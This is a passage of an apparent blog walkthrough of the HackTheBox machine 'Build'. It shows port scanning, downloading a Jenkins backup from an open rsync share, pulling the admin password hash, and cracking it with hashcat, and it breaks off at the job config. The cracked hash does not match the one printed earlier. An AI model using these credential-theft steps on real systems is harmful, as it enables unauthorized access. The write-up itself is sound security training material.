@@ -1,0 +1,974 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Build</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-build">htb-build</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#lft">lft</a> <a class="post-tag" href="/tags#gitea">gitea</a> <a class="post-tag" href="/tags#rsync">rsync</a> <a class="post-tag" href="/tags#htb-builder">htb-builder</a> <a class="post-tag" href="/tags#htb-zetta">htb-zetta</a> <a class="post-tag" href="/tags#htb-unbalanced">htb-unbalanced</a> <a class="post-tag" href="/tags#jenkins">jenkins</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#jenkins-credentials-decryptor">jenkins-credentials-decryptor</a> <a class="post-tag" href="/tags#jenkins-credentials">jenkins-credentials</a> <a class="post-tag" href="/tags#htb-object">htb-object</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#htb-reset">htb-reset</a> <a class="post-tag" href="/tags#tunnel">tunnel</a> <a class="post-tag" href="/tags#chisel">chisel</a> <a class="post-tag" href="/tags#foxyproxy">foxyproxy</a> <a class="post-tag" href="/tags#proxychains">proxychains</a> <a class="post-tag" href="/tags#powerdns-admin">powerdns-admin</a> <a class="post-tag" href="/tags#rlogin">rlogin</a> <a class="post-tag" href="/tags#berkeley-r-commands">berkeley-r-commands</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-08-05T09:00:00+00:00" itemprop="datePublished">Aug 5, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/08/05/htb-build.html" style="color: #e6e6e6; text-decoration: none;">HTB: Build</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/build-cover.webp" type="image/webp"/>
+<img alt="Build" class="include_image" loading="lazy" src="/img/build-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Build starts with a Jenkins backup on an rsync server. I’ll download and decrypt a password to get access to a Gitea instance. I’ll update a Jenkins pipeline and get execution in a Docker container I’ll find PowerDNS-Admin running in another container, and on gaining access to that, set my host to have a hostname that’s allowed to authenticate using rlogin without a password, providing root access.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/689 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/build" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Build</a> <a href="https://hackthebox.com/machines/build" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-build.webp" type="image/webp"/> <img alt="Build" class="img-av" src="/icons/box-build.png"/></picture></a><br/><a href="https://hackthebox.com/machines/build" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1953646128366235945">05 Aug 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">05 Aug 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds seven open TCP ports, SSH (22), DNS (53), rsync (873), HTTP (3000), and three Berkeley r-commands (512-514):</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="1100"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.234.169
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-29 20:07 UTC
+...[snip]...
+Completed SYN Stealth Scan at 20:07, 6.65s elapsed (65535 total ports)
+Nmap scan report for 10.129.234.169
+Host is up, received echo-reply ttl 63 (0.092s latency).
+Scanned at 2025-07-29 20:07:34 UTC for 7s
+Not shown: 65526 closed tcp ports (reset)
+PORT     STATE    SERVICE         REASON
+22/tcp   open     ssh             syn-ack ttl 63
+53/tcp   open     domain          syn-ack ttl 62
+512/tcp  open     exec            syn-ack ttl 63
+513/tcp  open     login           syn-ack ttl 63
+514/tcp  open     shell           syn-ack ttl 63
+873/tcp  open     rsync           syn-ack ttl 63
+3000/tcp open     ppp             syn-ack ttl 62
+3306/tcp filtered mysql           no-response
+8081/tcp filtered blackice-icecap no-response
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
+           Raw packets sent: 65582 (2.886MB) | Rcvd: 65573 (2.623MB)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,53,512,513,514,873,3000 <span class="nt">-sCV</span> 10.129.234.169
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-29 20:13 UTC
+Nmap scan report for 10.129.234.169
+Host is up (0.093s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 47:21:73:e2:6b:96:cd:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)
+|_  256 2b:5e:ba:f3:72:d3:b3:09:df:25:41:29:09:f4:7b:f5 (ED25519)
+53/tcp   open  domain  PowerDNS
+| dns-nsid:
+|   NSID: pdns (70646e73)
+|_  id.server: pdns
+512/tcp  open  exec    netkit-rsh rexecd
+513/tcp  open  login?
+514/tcp  open  shell   Netkit rshd
+873/tcp  open  rsync   (protocol version 31)
+3000/tcp open  ppp?
+| fingerprint-strings:
+|   GenericLines, Help, RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=85eae5b274a8b5a7; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=QH-D-H2C9h1uu87K81WCjR4gDE86MTc1MzgyMDk3NTM0NDAyNDMwMw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Tue, 29 Jul 2025 20:29:35 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en-US" class="theme-auto"&gt;
+|     &lt;head&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
+|     &lt;link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ
+|   HTTPOptions:
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=bca0955b853ad2f0; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=JS8XxYtWklYil4EHg0TQPVWI4d06MTc1MzgyMDk4MTQ0MTU4OTE1Ng; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Tue, 29 Jul 2025 20:29:41 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.94SVN%I=7%D=7/29%Time=68892B5A%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request")%r(GetRequest,2A60,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
+SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
+SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
+SF:ea=85eae5b274a8b5a7;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
+SF:kie:\x20_csrf=QH-D-H2C9h1uu87K81WCjR4gDE86MTc1MzgyMDk3NTM0NDAyNDMwMw;\x
+SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2029\x20Jul\x202025\x2020:29:35\x
+SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en-US\"\x20class=\"the
+SF:me-auto\"&gt;\n&lt;head&gt;\n\t&lt;meta\x20name=\"viewport\"\x20content=\"width=dev
+SF:ice-width,\x20initial-scale=1\"&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x20a\x
+SF:20cup\x20of\x20tea&lt;/title&gt;\n\t&lt;link\x20rel=\"manifest\"\x20href=\"data:
+SF:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHR
+SF:lYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rhcn
+SF:RfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6L
+SF:y9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5n
+SF:Iiwic2l6ZXMiOiI1MTJ")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
+SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
+SF:\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Me
+SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
+SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
+SF:et-Cookie:\x20i_like_gitea=bca0955b853ad2f0;\x20Path=/;\x20HttpOnly;\x2
+SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=JS8XxYtWklYil4EHg0TQPVWI4d06MTc1M
+SF:zgyMDk4MTQ0MTU4OTE1Ng;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
+SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2029\x20J
+SF:ul\x202025\x2020:29:41\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
+SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+SF:quest");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 108.06 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH version</a> version, the host is likely running Ubuntu 22.40 jammy [LTS] (though it could also be 22.10 kinetic).</p>
+<p>Two ports show up as filtered (3306 typically MySQL and 8081 likely a webserver of some kind).</p>
+<p>Two ports (DNS and HTTP) show a TTL of 62, one less than the <a href="/cheatsheets/os#os-identification">expected TTL</a> of 63 for a Linux host one hop away. <code class="language-plaintext highlighter-rouge">lft</code> confirms this:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>lft 10.129.234.169:22
+<span class="go">Tracing ......T
+TTL LFT trace to 10.129.234.169:22/tcp
+ 1  10.10.14.1 91.9ms
+ 2  [target open] 10.129.234.169:22 92.0ms
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>lft 10.129.234.169:53
+<span class="go">Tracing ......T
+TTL LFT trace to 10.129.234.169:53/tcp
+ 1  10.10.14.1 92.0ms
+ 2  10.129.234.169 92.1ms
+ 3  [target open] 10.129.234.169:53 92.1ms
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>lft 10.129.234.169:3000
+<span class="go">Tracing ......T
+TTL LFT trace to 10.129.234.169:3000/tcp
+ 1  10.10.14.1 92.1ms
+ 2  10.129.234.169 92.0ms
+ 3  [target open] 10.129.234.169:3000 92.1ms
+</span></code></pre></div></div>
+<p>That implies these services are running in a nested VM or container.</p>
+<h3 id="gitea---tcp-3000">Gitea - TCP 3000</h3>
+<h4 id="site">Site</h4>
+<p>This webserver is an instance of <a href="https://about.gitea.com/">Gitea</a>:</p>
+<picture>
+<source srcset="/img/image-20250729162116274.webp" type="image/webp"/>
+<img alt="image-20250729162116274" class="include_image" loading="lazy" src="/img/image-20250729162116274.png"/>
+</picture>
+<p>Under “Explore” there’s one public repo, buildadm/dev:</p>
+<picture>
+<source srcset="/img/image-20250729162212559.webp" type="image/webp"/>
+<img alt="image-20250729162212559" class="include_image" loading="lazy" src="/img/image-20250729162212559.png"/>
+</picture>
+<p>It has a single file, <code class="language-plaintext highlighter-rouge">Jenkinsfile</code>:</p>
+<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pipeline</span> <span class="o">{</span>
+    <span class="n">agent</span> <span class="n">any</span>
+
+    <span class="n">stages</span> <span class="o">{</span>
+        <span class="n">stage</span><span class="o">(</span><span class="s1">'Do nothing'</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">steps</span> <span class="o">{</span>
+                <span class="n">sh</span> <span class="s1">'/bin/true'</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>That file has the same structure as the Pipeline I used in <a href="/2024/02/12/htb-builder.html#via-pipeline-ssh">Builder</a>.</p>
+<p>I’m able to register, but that doesn’t display any additional repos or people.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The footer shows that this is Gitea version 1.21.11:</p>
+<picture>
+<source srcset="/img/image-20250729162411303.webp" type="image/webp"/>
+<img alt="image-20250729162411303" class="include_image" loading="lazy" src="/img/image-20250729162411303.png"/>
+</picture>
+<p>Nothing else too interesting here, and no need to directory brute force as it’s known software.</p>
+<h3 id="rsync---tcp-873">rsync - TCP 873</h3>
+<p>I’ll list the directories available over rsync (similar to what I showed in <a href="/2020/02/22/htb-zetta.html#rsync---tcp-8730">Zetta</a> and <a href="/2020/12/05/htb-unbalanced.html#rsync---tcp-873">Unbalanced</a>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rsync <span class="nt">--list-only</span> <span class="nt">-a</span> rsync://10.129.234.169
+<span class="go">backups         backups
+</span></code></pre></div></div>
+<p>There’s a single directory named <code class="language-plaintext highlighter-rouge">backups</code> with the comment “backups”. It has a single tar archive:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rsync <span class="nt">--list-only</span> <span class="nt">-a</span> rsync://10.129.234.169/backups
+<span class="go">drwxr-xr-x          4,096 2024/05/02 13:26:31 .
+-rw-r--r--    376,289,280 2024/05/02 13:26:19 jenkins.tar.gz
+</span></code></pre></div></div>
+<p>I’ll grab it, which takes a minute as it’s very large (almost 360MB):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rsync <span class="nt">-a</span> rsync://10.129.234.169/backups/jenkins.tar.gz <span class="nb">.</span>
+</code></pre></div></div>
+<h3 id="jenkins-backup">Jenkins Backup</h3>
+<h4 id="unpack">Unpack</h4>
+<p>I’ll extract the files from the Jenkins backup archive:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">tar </span>xf jenkins.tar.gz 
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls </span>jenkins_configuration/
+<span class="go">caches
+com.cloudbees.hudson.plugins.folder.config.AbstractFolderConfiguration.xml
+config.xml
+copy_reference_file.log
+fingerprints
+hudson.model.UpdateCenter.xml
+hudson.plugins.build_timeout.global.GlobalTimeOutConfiguration.xml
+hudson.plugins.build_timeout.operations.BuildStepOperation.xml
+hudson.plugins.git.GitSCM.xml
+hudson.plugins.git.GitTool.xml
+hudson.plugins.timestamper.TimestamperConfig.xml
+hudson.tasks.Mailer.xml
+hudson.tasks.Shell.xml
+hudson.triggers.SCMTrigger.xml
+identity.key.enc
+io.jenkins.plugins.junit.storage.JunitTestResultStorageConfiguration.xml
+jenkins.fingerprints.GlobalFingerprintConfiguration.xml
+jenkins.install.InstallUtil.lastExecVersion
+jenkins.install.UpgradeWizard.state
+jenkins.model.ArtifactManagerConfiguration.xml
+jenkins.model.GlobalBuildDiscarderConfiguration.xml
+jenkins.model.JenkinsLocationConfiguration.xml
+jenkins.security.ResourceDomainConfiguration.xml
+jenkins.tasks.filters.EnvVarsFilterGlobalConfiguration.xml
+jenkins.telemetry.Correlator.xml
+jobs
+logs
+nodeMonitors.xml
+nodes
+org.jenkinsci.plugin.gitea.servers.GiteaServers.xml
+org.jenkinsci.plugins.displayurlapi.DefaultDisplayURLProviderGlobalConfiguration.xml
+org.jenkinsci.plugins.workflow.flow.FlowExecutionList.xml
+org.jenkinsci.plugins.workflow.flow.GlobalDefaultFlowDurabilityLevel.xml
+org.jenkinsci.plugins.workflow.libs.GlobalLibraries.xml
+plugins
+queue.xml.bak
+secret.key
+secret.key.not-so-secret
+secrets
+updates
+userContent
+users
+war
+workspace
+</span></code></pre></div></div>
+<p>There’s a lot here.</p>
+<h4 id="domains">Domains</h4>
+<p>I’ll search for and <code class="language-plaintext highlighter-rouge">.vl</code> domain strings in the data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s1">'\.vl'</span> jenkins_configuration/
+<span class="go">jenkins_configuration/jobs/build/state.xml:          &lt;avatar&gt;http://build.vl:3000/avatar/204239236134d8e6eb156992dd11c53e&lt;/avatar&gt;
+grep: jenkins_configuration/plugins/git-client/WEB-INF/lib/JavaEWAH-1.2.3.jar: binary file matches
+grep: jenkins_configuration/plugins/git-client/WEB-INF/lib/org.eclipse.jgit-6.9.0.202403050737-r.jar: binary file matches
+grep: jenkins_configuration/plugins/trilead-api/WEB-INF/lib/eddsa-0.3.0.jar: binary file matches
+grep: jenkins_configuration/plugins/gradle.jpi: binary file matches
+grep: jenkins_configuration/plugins/mina-sshd-api-common.jpi: binary file matches
+grep: jenkins_configuration/plugins/ldap.jpi: binary file matches
+grep: jenkins_configuration/plugins/caffeine-api/WEB-INF/lib/caffeine-3.1.8.jar: binary file matches
+grep: jenkins_configuration/plugins/gradle/WEB-INF/lib/gradle-2.11.jar: binary file matches
+grep: jenkins_configuration/plugins/trilead-api.jpi: binary file matches
+grep: jenkins_configuration/plugins/gitea/WEB-INF/lib/gitea.jar: binary file matches
+grep: jenkins_configuration/war/WEB-INF/lib/guava-33.0.0-jre.jar: binary file matches
+grep: jenkins_configuration/war/WEB-INF/lib/groovy-all-2.4.21.jar: binary file matches
+grep: jenkins_configuration/war/WEB-INF/detached-plugins/plugin-util-api.hpi: binary file matches
+grep: jenkins_configuration/war/WEB-INF/detached-plugins/echarts-api.hpi: binary file matches
+jenkins_configuration/jenkins.model.JenkinsLocationConfiguration.xml:  &lt;jenkinsUrl&gt;http://build.vl:5000/&lt;/jenkinsUrl&gt;
+jenkins_configuration/org.jenkinsci.plugin.gitea.servers.GiteaServers.xml:      &lt;displayName&gt;gitea.build.vl&lt;/displayName&gt;
+jenkins_configuration/users/admin_8569439066427679502/config.xml:      &lt;emailAddress&gt;admin@build.vl&lt;/emailAddress&gt;
+</span></code></pre></div></div>
+<p>It seems the server uses <code class="language-plaintext highlighter-rouge">build.vl</code>, and Gitea may even use <code class="language-plaintext highlighter-rouge">gitea.build.vl</code>. The admin’s email is <code class="language-plaintext highlighter-rouge">admin@build.vl</code>.</p>
+<p>I could take this domain and try to brute force subdomains on the webserver or on DNS, but I won’t need to.</p>
+<h4 id="users">Users</h4>
+<p>The <code class="language-plaintext highlighter-rouge">users/users.xml</code> file has the users for Jenkins:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat users</span>/users.xml 
+<span class="go">&lt;?xml version='1.1' encoding='UTF-8'?&gt;
+&lt;hudson.model.UserIdMapper&gt;
+  &lt;version&gt;1&lt;/version&gt;
+  &lt;idToDirectoryNameMap class="concurrent-hash-map"&gt;
+    &lt;entry&gt;
+      &lt;string&gt;admin&lt;/string&gt;
+      &lt;string&gt;admin_8569439066427679502&lt;/string&gt;
+    &lt;/entry&gt;
+  &lt;/idToDirectoryNameMap&gt;
+&lt;/hudson.model.UserIdMapper&gt;
+</span></code></pre></div></div>
+<p>There’s one user admin, with a directory name <code class="language-plaintext highlighter-rouge">admin_8569439066427679502</code>. admin’s configuration is stored at <code class="language-plaintext highlighter-rouge">users/admin_8569439066427679502/config.xml</code>, and includes a password hash:</p>
+<div class="language-xml code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.1' encoding='UTF-8'?&gt;</span>
+<span class="nt">&lt;user&gt;</span>
+  <span class="nt">&lt;version&gt;</span>10<span class="nt">&lt;/version&gt;</span>
+  <span class="nt">&lt;id&gt;</span>admin<span class="nt">&lt;/id&gt;</span>
+  <span class="nt">&lt;fullName&gt;</span>admin<span class="nt">&lt;/fullName&gt;</span>
+  <span class="nt">&lt;properties&gt;</span>
+    <span class="nt">&lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;</span>
+    <span class="nt">&lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty</span> <span class="na">plugin=</span><span class="s">"credentials@1337.v60b_d7b_c7b_c9f"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;domainCredentialsMap</span> <span class="na">class=</span><span class="s">"hudson.util.CopyOnWriteMap$Hash"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;</span>
+    <span class="nt">&lt;hudson.model.MyViewsProperty&gt;</span>
+      <span class="nt">&lt;views&gt;</span>
+        <span class="nt">&lt;hudson.model.AllView&gt;</span>
+          <span class="nt">&lt;owner</span> <span class="na">class=</span><span class="s">"hudson.model.MyViewsProperty"</span> <span class="na">reference=</span><span class="s">"../../.."</span><span class="nt">/&gt;</span>
+          <span class="nt">&lt;name&gt;</span>all<span class="nt">&lt;/name&gt;</span>
+          <span class="nt">&lt;filterExecutors&gt;</span>false<span class="nt">&lt;/filterExecutors&gt;</span>
+          <span class="nt">&lt;filterQueue&gt;</span>false<span class="nt">&lt;/filterQueue&gt;</span>
+          <span class="nt">&lt;properties</span> <span class="na">class=</span><span class="s">"hudson.model.View$PropertyList"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/hudson.model.AllView&gt;</span>
+      <span class="nt">&lt;/views&gt;</span>
+    <span class="nt">&lt;/hudson.model.MyViewsProperty&gt;</span>
+    <span class="nt">&lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty</span> <span class="na">plugin=</span><span class="s">"display-url-api@2.204.vf6fddd8a_8b_e9"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;providerId&gt;</span>default<span class="nt">&lt;/providerId&gt;</span>
+    <span class="nt">&lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;</span>
+    <span class="nt">&lt;hudson.model.PaneStatusProperties&gt;</span>
+      <span class="nt">&lt;collapsed/&gt;</span>
+    <span class="nt">&lt;/hudson.model.PaneStatusProperties&gt;</span>
+    <span class="nt">&lt;jenkins.security.seed.UserSeedProperty&gt;</span>
+      <span class="nt">&lt;seed&gt;</span>5a9e1f21231c806b<span class="nt">&lt;/seed&gt;</span>
+    <span class="nt">&lt;/jenkins.security.seed.UserSeedProperty&gt;</span>
+    <span class="nt">&lt;hudson.search.UserSearchProperty&gt;</span>
+      <span class="nt">&lt;insensitiveSearch&gt;</span>true<span class="nt">&lt;/insensitiveSearch&gt;</span>
+    <span class="nt">&lt;/hudson.search.UserSearchProperty&gt;</span>
+    <span class="nt">&lt;io.jenkins.plugins.thememanager.ThemeUserProperty</span> <span class="na">plugin=</span><span class="s">"theme-manager@215.vc1ff18d67920"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;hudson.model.TimeZoneProperty/&gt;</span>
+    <span class="nt">&lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;</span>
+      <span class="nt">&lt;flags/&gt;</span>
+    <span class="nt">&lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;</span>
+    <span class="nt">&lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;</span>
+      <span class="nt">&lt;passwordHash&gt;</span>#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG<span class="nt">&lt;/passwordHash&gt;</span>
+    <span class="nt">&lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;</span>
+    <span class="nt">&lt;hudson.tasks.Mailer_-UserProperty</span> <span class="na">plugin=</span><span class="s">"mailer@472.vf7c289a_4b_420"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;emailAddress&gt;</span>admin@build.vl<span class="nt">&lt;/emailAddress&gt;</span>
+    <span class="nt">&lt;/hudson.tasks.Mailer_-UserProperty&gt;</span>
+    <span class="nt">&lt;jenkins.security.ApiTokenProperty&gt;</span>
+      <span class="nt">&lt;tokenStore&gt;</span>
+        <span class="nt">&lt;tokenList/&gt;</span>
+      <span class="nt">&lt;/tokenStore&gt;</span>
+    <span class="nt">&lt;/jenkins.security.ApiTokenProperty&gt;</span>
+  <span class="nt">&lt;/properties&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div></div>
+<p>I’ll throw this into <code class="language-plaintext highlighter-rouge">hashcat</code> with mode 3200 (just like in <a href="/2024/02/12/htb-builder.html#crack-hash">Builder</a>) and it cracks to “princess”:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat admin.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nt">-m</span> 3200
+<span class="go">hashcat (v6.2.6) starting
+...[snip]...
+$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
+...[snip]...
+</span></code></pre></div></div>
+<p>I’ll try this password with both admin and buildadm over SSH, but it doesn’t work.</p>
+<h4 id="config">Config</h4>
+<p>The build config is stored at <code class="language-plaintext highlighter-rouge">jobs/build/config.xml</code>. It’s a long file:</p>
+<div class="language-xml code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.1' encoding='UTF-8'?&gt;</span>
